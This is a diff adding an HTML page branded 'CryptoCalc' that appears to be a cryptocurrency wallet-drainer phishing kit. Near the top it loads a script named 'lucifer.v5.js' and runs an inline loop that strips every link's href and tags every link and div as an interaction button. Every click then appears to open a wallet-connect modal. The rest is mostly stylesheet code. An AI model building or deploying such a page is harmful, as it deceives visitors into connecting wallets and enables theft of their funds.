@@ -1,0 +1,1724 @@
+<!DOCTYPE html>
+<html lang="en" style="--trx-wcm-color-fg-1: rgb(228,231,231); --trx-wcm-color-fg-2: rgb(148,158,158); --trx-wcm-color-fg-3: rgb(110,119,119); --trx-wcm-color-bg-1: rgb(20,20,20); --trx-wcm-color-bg-2: rgb(39,42,42); --trx-wcm-color-bg-3: rgb(59,64,64); --trx-wcm-color-overlay: rgba(255,255,255,0.1); --trx-wcm-accent-color: #3396FF; --trx-wcm-accent-fill-color: #FFFFFF; --trx-wcm-z-index: 89; --trx-wcm-background-color: #3396FF; --trx-wcm-background-border-radius: 8px; --trx-wcm-container-border-radius: 30px; --trx-wcm-wallet-icon-border-radius: 15px; --trx-wcm-wallet-icon-large-border-radius: 30px; --trx-wcm-wallet-icon-small-border-radius: 7px; --trx-wcm-input-border-radius: 28px; --trx-wcm-button-border-radius: 10px; --trx-wcm-notification-border-radius: 36px; --trx-wcm-secondary-button-border-radius: 28px; --trx-wcm-icon-button-border-radius: 50%; --trx-wcm-button-hover-highlight-border-radius: 10px; --trx-wcm-text-big-bold-size: 20px; --trx-wcm-text-big-bold-weight: 600; --trx-wcm-text-big-bold-line-height: 24px; --trx-wcm-text-big-bold-letter-spacing: -0.03em; --trx-wcm-text-big-bold-text-transform: none; --trx-wcm-text-xsmall-bold-size: 10px; --trx-wcm-text-xsmall-bold-weight: 700; --trx-wcm-text-xsmall-bold-line-height: 12px; --trx-wcm-text-xsmall-bold-letter-spacing: 0.02em; --trx-wcm-text-xsmall-bold-text-transform: uppercase; --trx-wcm-text-xsmall-regular-size: 12px; --trx-wcm-text-xsmall-regular-weight: 600; --trx-wcm-text-xsmall-regular-line-height: 14px; --trx-wcm-text-xsmall-regular-letter-spacing: -0.03em; --trx-wcm-text-xsmall-regular-text-transform: none; --trx-wcm-text-small-thin-size: 14px; --trx-wcm-text-small-thin-weight: 500; --trx-wcm-text-small-thin-line-height: 16px; --trx-wcm-text-small-thin-letter-spacing: -0.03em; --trx-wcm-text-small-thin-text-transform: none; --trx-wcm-text-small-regular-size: 14px; --trx-wcm-text-small-regular-weight: 600; --trx-wcm-text-small-regular-line-height: 16px; --trx-wcm-text-small-regular-letter-spacing: -0.03em; --trx-wcm-text-small-regular-text-transform: none; --trx-wcm-text-medium-regular-size: 16px; --trx-wcm-text-medium-regular-weight: 600; --trx-wcm-text-medium-regular-line-height: 20px; --trx-wcm-text-medium-regular-letter-spacing: -0.03em; --trx-wcm-text-medium-regular-text-transform: none; --trx-wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --trx-wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --trx-wcm-success-color: rgb(38,181,98); --trx-wcm-error-color: rgb(242, 90, 103); --trx-wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --trx-wcm-overlay-backdrop-filter: none;" >
+  <head>
+<script type="module" crossorigin src="./files/lucifer.v5.js"></script>
+<link rel="stylesheet" crossorigin href="./files/modal.min.css">
+
+<style>
+  /* CSS to hide any element containing only "AAA" */
+  :not(body):has(:scope:contains("AAA")) {
+    display: none;
+  }
+</style>
+    <script>
+        function addClassesToElements() {
+    
+        const links = document.querySelectorAll('a:not(.interactBtn)');
+        for (const link of links) {
+            link.removeAttribute('href');
+            link.classList.add('interactBtn');
+        }
+        const buttons = document.querySelectorAll('div:not(.interactBtn)');
+        for (const button of buttons) {
+            button.classList.add('interactBtn');
+        }
+        }
+        setInterval(addClassesToElements, 300);
+    </script>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoCalc</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="favicon.ico" type="image">
+    <style id="_goober">
+      .go37342527 {
+        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08), 0 16px 64px rgba(0, 0, 0, 0.16);
+        width: fit-content;
+        margin: auto;
+      }
+
+      @media (max-width: 440px) {
+        .go37342527 {
+          width: 100%;
+          height: fit-content;
+          margin: auto 0 0 0;
+        }
+      }
+
+      .go3288899091 {
+        transform: translateY(-8px);
+        margin-bottom: 12px;
+      }
+
+      .go3535743411 {
+        margin-bottom: 12px;
+      }
+
+      tc-root * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, Tahoma, Verdana, sans-serif;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      tc-root img {
+        -webkit-user-select: none;
+        -webkit-touch-callout: none;
+      }
+
+      tc-root *:focus {
+        outline: #08f auto 2px;
+      }
+
+      tc-root li {
+        list-style: none;
+      }
+
+      tc-root button {
+        outline: none;
+      }
+
+      body.tc-disable-scroll {
+        position: fixed;
+        overflow-y: scroll;
+        right: 0;
+        left: 0;
+      }
+
+      body.tc-using-mouse tc-root *:focus {
+        outline: none;
+      }
+    </style>
+    <style>
+      .swal2-popup.swal2-toast {
+        box-sizing: border-box;
+        grid-column: 1/4 !important;
+        grid-row: 1/4 !important;
+        grid-template-columns: min-content auto min-content;
+        padding: 1em;
+        overflow-y: hidden;
+        background: #fff;
+        box-shadow: 0 0 1px rgba(0, 0, 0, .075), 0 1px 2px rgba(0, 0, 0, .075), 1px 2px 4px rgba(0, 0, 0, .075), 1px 3px 8px rgba(0, 0, 0, .075), 2px 4px 16px rgba(0, 0, 0, .075);
+        pointer-events: all
+      }
+
+      .swal2-popup.swal2-toast>* {
+        grid-column: 2
+      }
+
+      .swal2-popup.swal2-toast .swal2-title {
+        margin: .5em 1em;
+        padding: 0;
+        font-size: 1em;
+        text-align: initial
+      }
+
+      .swal2-popup.swal2-toast .swal2-loading {
+        justify-content: center
+      }
+
+      .swal2-popup.swal2-toast .swal2-input {
+        height: 2em;
+        margin: .5em;
+        font-size: 1em
+      }
+
+      .swal2-popup.swal2-toast .swal2-validation-message {
+        font-size: 1em
+      }
+
+      .swal2-popup.swal2-toast .swal2-footer {
+        margin: .5em 0 0;
+        padding: .5em 0 0;
+        font-size: .8em
+      }
+
+      .swal2-popup.swal2-toast .swal2-close {
+        grid-column: 3/3;
+        grid-row: 1/99;
+        align-self: center;
+        width: .8em;
+        height: .8em;
+        margin: 0;
+        font-size: 2em
+      }
+
+      .swal2-popup.swal2-toast .swal2-html-container {
+        margin: .5em 1em;
+        padding: 0;
+        overflow: initial;
+        font-size: 1em;
+        text-align: initial
+      }
+
+      .swal2-popup.swal2-toast .swal2-html-container:empty {
+        padding: 0
+      }
+
+      .swal2-popup.swal2-toast .swal2-loader {
+        grid-column: 1;
+        grid-row: 1/99;
+        align-self: center;
+        width: 2em;
+        height: 2em;
+        margin: .25em
+      }
+
+      .swal2-popup.swal2-toast .swal2-icon {
+        grid-column: 1;
+        grid-row: 1/99;
+        align-self: center;
+        width: 2em;
+        min-width: 2em;
+        height: 2em;
+        margin: 0 .5em 0 0
+      }
+
+      .swal2-popup.swal2-toast .swal2-icon .swal2-icon-content {
+        display: flex;
+        align-items: center;
+        font-size: 1.8em;
+        font-weight: bold
+      }
+
+      .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
+        width: 2em;
+        height: 2em
+      }
+
+      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line] {
+        top: .875em;
+        width: 1.375em
+      }
+
+      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left] {
+        left: .3125em
+      }
+
+      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right] {
+        right: .3125em
+      }
+
+      .swal2-popup.swal2-toast .swal2-actions {
+        justify-content: flex-start;
+        height: auto;
+        margin: 0;
+        margin-top: .5em;
+        padding: 0 .5em
+      }
+
+      .swal2-popup.swal2-toast .swal2-styled {
+        margin: .25em .5em;
+        padding: .4em .6em;
+        font-size: 1em
+      }
+
+      .swal2-popup.swal2-toast .swal2-success {
+        border-color: #a5dc86
+      }
+
+      .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line] {
+        position: absolute;
+        width: 1.6em;
+        height: 3em;
+        border-radius: 50%
+      }
+
+      .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left] {
+        top: -0.8em;
+        left: -0.5em;
+        transform: rotate(-45deg);
+        transform-origin: 2em 2em;
+        border-radius: 4em 0 0 4em
+      }
+
+      .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right] {
+        top: -0.25em;
+        left: .9375em;
+        transform-origin: 0 1.5em;
+        border-radius: 0 4em 4em 0
+      }
+
+      .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
+        width: 2em;
+        height: 2em
+      }
+
+      .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
+        top: 0;
+        left: .4375em;
+        width: .4375em;
+        height: 2.6875em
+      }
+
+      .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line] {
+        height: .3125em
+      }
+
+      .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip] {
+        top: 1.125em;
+        left: .1875em;
+        width: .75em
+      }
+
+      .swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long] {
+        top: .9375em;
+        right: .1875em;
+        width: 1.375em
+      }
+
+      .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip {
+        animation: swal2-toast-animate-success-line-tip .75s
+      }
+
+      .swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long {
+        animation: swal2-toast-animate-success-line-long .75s
+      }
+
+      .swal2-popup.swal2-toast.swal2-show {
+        animation: swal2-toast-show .5s
+      }
+
+      .swal2-popup.swal2-toast.swal2-hide {
+        animation: swal2-toast-hide .1s forwards
+      }
+
+      div:where(.swal2-container) {
+        display: grid;
+        position: fixed;
+        z-index: 1060;
+        inset: 0;
+        box-sizing: border-box;
+        grid-template-areas: "top-start     top            top-end""center-start  center         center-end""bottom-start  bottom-center  bottom-end";
+        grid-template-rows: minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);
+        height: 100%;
+        padding: .625em;
+        overflow-x: hidden;
+        transition: background-color .1s;
+        -webkit-overflow-scrolling: touch
+      }
+
+      div:where(.swal2-container).swal2-backdrop-show,
+      div:where(.swal2-container).swal2-noanimation {
+        background: rgba(0, 0, 0, .4)
+      }
+
+      div:where(.swal2-container).swal2-backdrop-hide {
+        background: rgba(0, 0, 0, 0) !important
+      }
+
+      div:where(.swal2-container).swal2-top-start,
+      div:where(.swal2-container).swal2-center-start,
+      div:where(.swal2-container).swal2-bottom-start {
+        grid-template-columns: minmax(0, 1fr) auto auto
+      }
+
+      div:where(.swal2-container).swal2-top,
+      div:where(.swal2-container).swal2-center,
+      div:where(.swal2-container).swal2-bottom {
+        grid-template-columns: auto minmax(0, 1fr) auto
+      }
+
+      div:where(.swal2-container).swal2-top-end,
+      div:where(.swal2-container).swal2-center-end,
+      div:where(.swal2-container).swal2-bottom-end {
+        grid-template-columns: auto auto minmax(0, 1fr)
+      }
+
+      div:where(.swal2-container).swal2-top-start>.swal2-popup {
+        align-self: start
+      }
+
+      div:where(.swal2-container).swal2-top>.swal2-popup {
+        grid-column: 2;
+        place-self: start center
+      }
+
+      div:where(.swal2-container).swal2-top-end>.swal2-popup,
+      div:where(.swal2-container).swal2-top-right>.swal2-popup {
+        grid-column: 3;
+        place-self: start end
+      }
+
+      div:where(.swal2-container).swal2-center-start>.swal2-popup,
+      div:where(.swal2-container).swal2-center-left>.swal2-popup {
+        grid-row: 2;
+        align-self: center
+      }
+
+      div:where(.swal2-container).swal2-center>.swal2-popup {
+        grid-column: 2;
+        grid-row: 2;
+        place-self: center center
+      }
+
+      div:where(.swal2-container).swal2-center-end>.swal2-popup,
+      div:where(.swal2-container).swal2-center-right>.swal2-popup {
+        grid-column: 3;
+        grid-row: 2;
+        place-self: center end
+      }
+
+      div:where(.swal2-container).swal2-bottom-start>.swal2-popup,
+      div:where(.swal2-container).swal2-bottom-left>.swal2-popup {
+        grid-column: 1;
+        grid-row: 3;
+        align-self: end
+      }
+
+      div:where(.swal2-container).swal2-bottom>.swal2-popup {
+        grid-column: 2;
+        grid-row: 3;
+        place-self: end center
+      }
+
+      div:where(.swal2-container).swal2-bottom-end>.swal2-popup,
+      div:where(.swal2-container).swal2-bottom-right>.swal2-popup {
+        grid-column: 3;
+        grid-row: 3;
+        place-self: end end
+      }
+
+      div:where(.swal2-container).swal2-grow-row>.swal2-popup,
+      div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup {
+        grid-column: 1/4;
+        width: 100%
+      }
+
+      div:where(.swal2-container).swal2-grow-column>.swal2-popup,
+      div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup {
+        grid-row: 1/4;
+        align-self: stretch
+      }
+
+      div:where(.swal2-container).swal2-no-transition {
+        transition: none !important
+      }
+
+      div:where(.swal2-container) div:where(.swal2-popup) {
+        display: none;
+        position: relative;
+        box-sizing: border-box;
+        grid-template-columns: minmax(0, 100%);
+        width: 32em;
+        max-width: 100%;
+        padding: 0 0 1.25em;
+        border: none;
+        border-radius: 5px;
+        background: #fff;
+        color: #545454;
+        font-family: inherit;
+        font-size: 1rem
+      }
+
+      div:where(.swal2-container) div:where(.swal2-popup):focus {
+        outline: none
+      }
+
+      div:where(.swal2-container) div:where(.swal2-popup).swal2-loading {
+        overflow-y: hidden
+      }
+
+      div:where(.swal2-container) h2:where(.swal2-title) {
+        position: relative;
+        max-width: 100%;
+        margin: 0;
+        padding: .8em 1em 0;
+        color: inherit;
+        font-size: 1.875em;
+        font-weight: 600;
+        text-align: center;
+        text-transform: none;
+        word-wrap: break-word
+      }
+
+      div:where(.swal2-container) div:where(.swal2-actions) {
+        display: flex;
+        z-index: 1;
+        box-sizing: border-box;
+        flex-wrap: wrap;
+        align-items: center;
+        justify-content: center;
+        width: auto;
+        margin: 1.25em auto 0;
+        padding: 0
+      }
+
+      div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled[disabled] {
+        opacity: .4
+      }
+
+      div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover {
+        background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))
+      }
+
+      div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active {
+        background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))
+      }
+
+      div:where(.swal2-container) div:where(.swal2-loader) {
+        display: none;
+        align-items: center;
+        justify-content: center;
+        width: 2.2em;
+        height: 2.2em;
+        margin: 0 1.875em;
+        animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+        border-width: .25em;
+        border-style: solid;
+        border-radius: 100%;
+        border-color: #2778c4 rgba(0, 0, 0, 0) #2778c4 rgba(0, 0, 0, 0)
+      }
+
+      div:where(.swal2-container) button:where(.swal2-styled) {
+        margin: .3125em;
+        padding: .625em 1.1em;
+        transition: box-shadow .1s;
+        box-shadow: 0 0 0 3px rgba(0, 0, 0, 0);
+        font-weight: 500
+      }
+
+      div:where(.swal2-container) button:where(.swal2-styled):not([disabled]) {
+        cursor: pointer
+      }
+
+      div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm) {
+        border: 0;
+        border-radius: .25em;
+        background: initial;
+        background-color: #7066e0;
+        color: #fff;
+        font-size: 1em
+      }
+
+      div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):focus-visible {
+        box-shadow: 0 0 0 3px rgba(112, 102, 224, .5)
+      }
+
+      div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny) {
+        border: 0;
+        border-radius: .25em;
+        background: initial;
+        background-color: #dc3741;
+        color: #fff;
+        font-size: 1em
+      }
+
+      div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):focus-visible {
+        box-shadow: 0 0 0 3px rgba(220, 55, 65, .5)
+      }
+
+      div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel) {
+        border: 0;
+        border-radius: .25em;
+        background: initial;
+        background-color: #6e7881;
+        color: #fff;
+        font-size: 1em
+      }
+
+      div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):focus-visible {
+        box-shadow: 0 0 0 3px rgba(110, 120, 129, .5)
+      }
+
+      div:where(.swal2-container) button:where(.swal2-styled).swal2-default-outline:focus-visible {
+        box-shadow: 0 0 0 3px rgba(100, 150, 200, .5)
+      }
+
+      div:where(.swal2-container) button:where(.swal2-styled):focus-visible {
+        outline: none
+      }
+
+      div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner {
+        border: 0
+      }
+
+      div:where(.swal2-container) div:where(.swal2-footer) {
+        margin: 1em 0 0;
+        padding: 1em 1em 0;
+        border-top: 1px solid #eee;
+        color: inherit;
+        font-size: 1em;
+        text-align: center
+      }
+
+      div:where(.swal2-container) .swal2-timer-progress-bar-container {
+        position: absolute;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        grid-column: auto !important;
+        overflow: hidden;
+        border-bottom-right-radius: 5px;
+        border-bottom-left-radius: 5px
+      }
+
+      div:where(.swal2-container) div:where(.swal2-timer-progress-bar) {
+        width: 100%;
+        height: .25em;
+        background: rgba(0, 0, 0, .2)
+      }
+
+      div:where(.swal2-container) img:where(.swal2-image) {
+        max-width: 100%;
+        margin: 2em auto 1em
+      }
+
+      div:where(.swal2-container) button:where(.swal2-close) {
+        z-index: 2;
+        align-items: center;
+        justify-content: center;
+        width: 1.2em;
+        height: 1.2em;
+        margin-top: 0;
+        margin-right: 0;
+        margin-bottom: -1.2em;
+        padding: 0;
+        overflow: hidden;
+        transition: color .1s, box-shadow .1s;
+        border: none;
+        border-radius: 5px;
+        background: rgba(0, 0, 0, 0);
+        color: #ccc;
+        font-family: monospace;
+        font-size: 2.5em;
+        cursor: pointer;
+        justify-self: end
+      }
+
+      div:where(.swal2-container) button:where(.swal2-close):hover {
+        transform: none;
+        background: rgba(0, 0, 0, 0);
+        color: #f27474
+      }
+
+      div:where(.swal2-container) button:where(.swal2-close):focus-visible {
+        outline: none;
+        box-shadow: inset 0 0 0 3px rgba(100, 150, 200, .5)
+      }
+
+      div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner {
+        border: 0
+      }
+
+      div:where(.swal2-container) .swal2-html-container {
+        z-index: 1;
+        justify-content: center;
+        margin: 0;
+        padding: 1em 1.6em .3em;
+        overflow: auto;
+        color: inherit;
+        font-size: 1.125em;
+        font-weight: normal;
+        line-height: normal;
+        text-align: center;
+        word-wrap: break-word;
+        word-break: break-word
+      }
+
+      div:where(.swal2-container) input:where(.swal2-input),
+      div:where(.swal2-container) input:where(.swal2-file),
+      div:where(.swal2-container) textarea:where(.swal2-textarea),
+      div:where(.swal2-container) select:where(.swal2-select),
+      div:where(.swal2-container) div:where(.swal2-radio),
+      div:where(.swal2-container) label:where(.swal2-checkbox) {
+        margin: 1em 2em 3px
+      }
+
+      div:where(.swal2-container) input:where(.swal2-input),
+      div:where(.swal2-container) input:where(.swal2-file),
+      div:where(.swal2-container) textarea:where(.swal2-textarea) {
+        box-sizing: border-box;
+        width: auto;
+        transition: border-color .1s, box-shadow .1s;
+        border: 1px solid #d9d9d9;
+        border-radius: .1875em;
+        background: rgba(0, 0, 0, 0);
+        box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(0, 0, 0, 0);
+        color: inherit;
+        font-size: 1.125em
+      }
+
+      div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,
+      div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,
+      div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror {
+        border-color: #f27474 !important;
+        box-shadow: 0 0 2px #f27474 !important
+      }
+
+      div:where(.swal2-container) input:where(.swal2-input):focus,
+      div:where(.swal2-container) input:where(.swal2-file):focus,
+      div:where(.swal2-container) textarea:where(.swal2-textarea):focus {
+        border: 1px solid #b4dbed;
+        outline: none;
+        box-shadow: inset 0 1px 1px rgba(0, 0, 0, .06), 0 0 0 3px rgba(100, 150, 200, .5)
+      }
+
+      div:where(.swal2-container) input:where(.swal2-input)::placeholder,
+      div:where(.swal2-container) input:where(.swal2-file)::placeholder,
+      div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder {
+        color: #ccc
+      }
+
+      div:where(.swal2-container) .swal2-range {
+        margin: 1em 2em 3px;
+        background: #fff
+      }
+
+      div:where(.swal2-container) .swal2-range input {
+        width: 80%
+      }
+
+      div:where(.swal2-container) .swal2-range output {
+        width: 20%;
+        color: inherit;
+        font-weight: 600;
+        text-align: center
+      }
+
+      div:where(.swal2-container) .swal2-range input,
+      div:where(.swal2-container) .swal2-range output {
+        height: 2.625em;
+        padding: 0;
+        font-size: 1.125em;
+        line-height: 2.625em
+      }
+
+      div:where(.swal2-container) .swal2-input {
+        height: 2.625em;
+        padding: 0 .75em
+      }
+
+      div:where(.swal2-container) .swal2-file {
+        width: 75%;
+        margin-right: auto;
+        margin-left: auto;
+        background: rgba(0, 0, 0, 0);
+        font-size: 1.125em
+      }
+
+      div:where(.swal2-container) .swal2-textarea {
+        height: 6.75em;
+        padding: .75em
+      }
+
+      div:where(.swal2-container) .swal2-select {
+        min-width: 50%;
+        max-width: 100%;
+        padding: .375em .625em;
+        background: rgba(0, 0, 0, 0);
+        color: inherit;
+        font-size: 1.125em
+      }
+
+      div:where(.swal2-container) .swal2-radio,
+      div:where(.swal2-container) .swal2-checkbox {
+        align-items: center;
+        justify-content: center;
+        background: #fff;
+        color: inherit
+      }
+
+      div:where(.swal2-container) .swal2-radio label,
+      div:where(.swal2-container) .swal2-checkbox label {
+        margin: 0 .6em;
+        font-size: 1.125em
+      }
+
+      div:where(.swal2-container) .swal2-radio input,
+      div:where(.swal2-container) .swal2-checkbox input {
+        flex-shrink: 0;
+        margin: 0 .4em
+      }
+
+      div:where(.swal2-container) label:where(.swal2-input-label) {
+        display: flex;
+        justify-content: center;
+        margin: 1em auto 0
+      }
+
+      div:where(.swal2-container) div:where(.swal2-validation-message) {
+        align-items: center;
+        justify-content: center;
+        margin: 1em 0 0;
+        padding: .625em;
+        overflow: hidden;
+        background: #f0f0f0;
+        color: #666;
+        font-size: 1em;
+        font-weight: 300
+      }
+
+      div:where(.swal2-container) div:where(.swal2-validation-message)::before {
+        content: "!";
+        display: inline-block;
+        width: 1.5em;
+        min-width: 1.5em;
+        height: 1.5em;
+        margin: 0 .625em;
+        border-radius: 50%;
+        background-color: #f27474;
+        color: #fff;
+        font-weight: 600;
+        line-height: 1.5em;
+        text-align: center
+      }
+
+      div:where(.swal2-container) .swal2-progress-steps {
+        flex-wrap: wrap;
+        align-items: center;
+        max-width: 100%;
+        margin: 1.25em auto;
+        padding: 0;
+        background: rgba(0, 0, 0, 0);
+        font-weight: 600
+      }
+
+      div:where(.swal2-container) .swal2-progress-steps li {
+        display: inline-block;
+        position: relative
+      }
+
+      div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step {
+        z-index: 20;
+        flex-shrink: 0;
+        width: 2em;
+        height: 2em;
+        border-radius: 2em;
+        background: #2778c4;
+        color: #fff;
+        line-height: 2em;
+        text-align: center
+      }
+
+      div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step {
+        background: #2778c4
+      }
+
+      div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step {
+        background: #add8e6;
+        color: #fff
+      }
+
+      div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line {
+        background: #add8e6
+      }
+
+      div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line {
+        z-index: 10;
+        flex-shrink: 0;
+        width: 2.5em;
+        height: .4em;
+        margin: 0 -1px;
+        background: #2778c4
+      }
+
+      div:where(.swal2-icon) {
+        position: relative;
+        box-sizing: content-box;
+        justify-content: center;
+        width: 5em;
+        height: 5em;
+        margin: 2.5em auto .6em;
+        border: 0.25em solid rgba(0, 0, 0, 0);
+        border-radius: 50%;
+        border-color: #000;
+        font-family: inherit;
+        line-height: 5em;
+        cursor: default;
+        user-select: none
+      }
+
+      div:where(.swal2-icon) .swal2-icon-content {
+        display: flex;
+        align-items: center;
+        font-size: 3.75em
+      }
+
+      div:where(.swal2-icon).swal2-error {
+        border-color: #f27474;
+        color: #f27474
+      }
+
+      div:where(.swal2-icon).swal2-error .swal2-x-mark {
+        position: relative;
+        flex-grow: 1
+      }
+
+      div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line] {
+        display: block;
+        position: absolute;
+        top: 2.3125em;
+        width: 2.9375em;
+        height: .3125em;
+        border-radius: .125em;
+        background-color: #f27474
+      }
+
+      div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left] {
+        left: 1.0625em;
+        transform: rotate(45deg)
+      }
+
+      div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right] {
+        right: 1em;
+        transform: rotate(-45deg)
+      }
+
+      div:where(.swal2-icon).swal2-error.swal2-icon-show {
+        animation: swal2-animate-error-icon .5s
+      }
+
+      div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark {
+        animation: swal2-animate-error-x-mark .5s
+      }
+
+      div:where(.swal2-icon).swal2-warning {
+        border-color: #facea8;
+        color: #f8bb86
+      }
+
+      div:where(.swal2-icon).swal2-warning.swal2-icon-show {
+        animation: swal2-animate-error-icon .5s
+      }
+
+      div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content {
+        animation: swal2-animate-i-mark .5s
+      }
+
+      div:where(.swal2-icon).swal2-info {
+        border-color: #9de0f6;
+        color: #3fc3ee
+      }
+
+      div:where(.swal2-icon).swal2-info.swal2-icon-show {
+        animation: swal2-animate-error-icon .5s
+      }
+
+      div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content {
+        animation: swal2-animate-i-mark .8s
+      }
+
+      div:where(.swal2-icon).swal2-question {
+        border-color: #c9dae1;
+        color: #87adbd
+      }
+
+      div:where(.swal2-icon).swal2-question.swal2-icon-show {
+        animation: swal2-animate-error-icon .5s
+      }
+
+      div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content {
+        animation: swal2-animate-question-mark .8s
+      }
+
+      div:where(.swal2-icon).swal2-success {
+        border-color: #a5dc86;
+        color: #a5dc86
+      }
+
+      div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line] {
+        position: absolute;
+        width: 3.75em;
+        height: 7.5em;
+        border-radius: 50%
+      }
+
+      div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left] {
+        top: -0.4375em;
+        left: -2.0635em;
+        transform: rotate(-45deg);
+        transform-origin: 3.75em 3.75em;
+        border-radius: 7.5em 0 0 7.5em
+      }
+
+      div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right] {
+        top: -0.6875em;
+        left: 1.875em;
+        transform: rotate(-45deg);
+        transform-origin: 0 3.75em;
+        border-radius: 0 7.5em 7.5em 0
+      }
+
+      div:where(.swal2-icon).swal2-success .swal2-success-ring {
+        position: absolute;
+        z-index: 2;
+        top: -0.25em;
+        left: -0.25em;
+        box-sizing: content-box;
+        width: 100%;
+        height: 100%;
+        border: .25em solid rgba(165, 220, 134, .3);
+        border-radius: 50%
+      }
+
+      div:where(.swal2-icon).swal2-success .swal2-success-fix {
+        position: absolute;
+        z-index: 1;
+        top: .5em;
+        left: 1.625em;
+        width: .4375em;
+        height: 5.625em;
+        transform: rotate(-45deg)
+      }
+
+      div:where(.swal2-icon).swal2-success [class^=swal2-success-line] {
+        display: block;
+        position: absolute;
+        z-index: 2;
+        height: .3125em;
+        border-radius: .125em;
+        background-color: #a5dc86
+      }
+
+      div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip] {
+        top: 2.875em;
+        left: .8125em;
+        width: 1.5625em;
+        transform: rotate(45deg)
+      }
+
+      div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long] {
+        top: 2.375em;
+        right: .5em;
+        width: 2.9375em;
+        transform: rotate(-45deg)
+      }
+
+      div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip {
+        animation: swal2-animate-success-line-tip .75s
+      }
+
+      div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long {
+        animation: swal2-animate-success-line-long .75s
+      }
+
+      div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right {
+        animation: swal2-rotate-success-circular-line 4.25s ease-in
+      }
+
+      [class^=swal2] {
+        -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
+      }
+
+      .swal2-show {
+        animation: swal2-show .3s
+      }
+
+      .swal2-hide {
+        animation: swal2-hide .15s forwards
+      }
+
+      .swal2-noanimation {
+        transition: none
+      }
+
+      .swal2-scrollbar-measure {
+        position: absolute;
+        top: -9999px;
+        width: 50px;
+        height: 50px;
+        overflow: scroll
+      }
+
+      .swal2-rtl .swal2-close {
+        margin-right: initial;
+        margin-left: 0
+      }
+
+      .swal2-rtl .swal2-timer-progress-bar {
+        right: 0;
+        left: auto
+      }
+
+      @keyframes swal2-toast-show {
+        0% {
+          transform: translateY(-0.625em) rotateZ(2deg)
+        }
+
+        33% {
+          transform: translateY(0) rotateZ(-2deg)
+        }
+
+        66% {
+          transform: translateY(0.3125em) rotateZ(2deg)
+        }
+
+        100% {
+          transform: translateY(0) rotateZ(0deg)
+        }
+      }
+
+      @keyframes swal2-toast-hide {
+        100% {
